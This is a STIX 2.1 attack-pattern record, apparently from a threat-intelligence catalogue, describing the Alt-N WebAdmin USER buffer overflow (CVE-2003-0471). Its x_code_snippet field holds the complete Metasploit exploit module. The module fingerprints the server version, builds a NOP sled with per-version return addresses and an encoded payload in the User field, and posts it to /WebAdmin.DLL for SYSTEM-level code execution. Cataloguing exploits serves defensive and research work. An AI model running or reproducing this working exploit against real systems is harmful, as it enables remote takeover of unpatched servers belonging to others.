{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3483c97a-c36f-4479-af0f-2ac052ba340a",
    "created": "2024-08-14T16:53:00.93165Z",
    "modified": "2024-08-14T16:53:00.931654Z",
    "name": "Alt-N WebAdmin USER Buffer Overflow",
    "description": " Alt-N WebAdmin is prone to a buffer overflow condition. This is due to insufficient bounds checking on the USER parameter. Successful exploitation could result in code execution with SYSTEM level privileges. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/altn_webadmin.rb",
            "external_id": "altn_webadmin.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0471"
        },
        {
            "source_name": "reference",
            "url": "http://www.nessus.org/plugins/index.php?view=single&id=11771"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Alt-N WebAdmin USER Buffer Overflow',\n      'Description'    => %q{\n        Alt-N WebAdmin is prone to a buffer overflow condition. This\n        is due to insufficient bounds checking on the USER\n        parameter. Successful exploitation could result in code\n        execution with SYSTEM level privileges.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2003-0471' ],\n          [ 'OSVDB', '2207' ],\n          [ 'BID', '8024'],\n          [ 'URL', 'http://www.nessus.org/plugins/index.php?view=single&id=11771']\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 830,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'StackAdjustment' => -3500,\n\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Automatic', {}],\n          ['WebAdmin 2.0.4 Universal', { 'Ret' => 0x10074d9b }], # 2.0.4 webAdmin.dll\n          ['WebAdmin 2.0.3 Universal', { 'Ret' => 0x10074b13 }], # 2.0.3 webAdmin.dll\n          ['WebAdmin 2.0.2 Universal', { 'Ret' => 0x10071e3b }], # 2.0.2 webAdmin.dll\n          ['WebAdmin 2.0.1 Universal', { 'Ret' => 0x100543c2 }], # 2.0.1 webAdmin.dll\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2003-06-24'))\n\n      register_options([Opt::RPORT(1000)])\n  end\n\n  def exploit\n\n    mytarget = target\n\n    if (target.name =~ /Automatic/)\n      res = send_request_raw({\n        'uri'   => '/WebAdmin.DLL'\n      }, -1)\n\n      if (res and res.body =~ /WebAdmin.*v(2\\..*)$/)\n        case $1\n        when /2\\.0\\.4/\n          mytarget = targets[1]\n        when /2\\.0\\.3/\n          mytarget = targets[2]\n        when /2\\.0\\.2/\n          mytarget = targets[3]\n        when /2\\.0\\.1/\n          mytarget = targets[4]\n        else\n          print_error(\"No target found for v#{$1}\")\n          return\n        end\n      else\n        print_error(\"No target found\")\n      end\n    end\n\n    user_cook = rand_text_alphanumeric(2)\n    post_data = 'User=' + make_nops(168) + [mytarget.ret].pack('V') + payload.encoded\n    post_data << '&Password=wtf&languageselect=en&Theme=Heavy&Logon=Sign+In'\n\n    print_status(\"Sending request...\")\n    res = send_request_cgi({\n      'uri'          => '/WebAdmin.DLL',\n      'query'        => 'View=Logon',\n      'method'       => 'POST',\n      'content-type' => 'application/x-www-form-urlencoded',\n      'cookie'       => \"User=#{user_cook}; Lang=en; Theme=standard\",\n      'data'         => post_data,\n      'headers'      =>\n      {\n        'Accept'          => 'image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png',\n        'Accept-Language' => 'en',\n        'Accept-Charset'  => 'iso-8859-1,*,utf-8'\n      }\n    }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-06-24",
    "x_mitre_platforms": [
        "win'"
    ]
}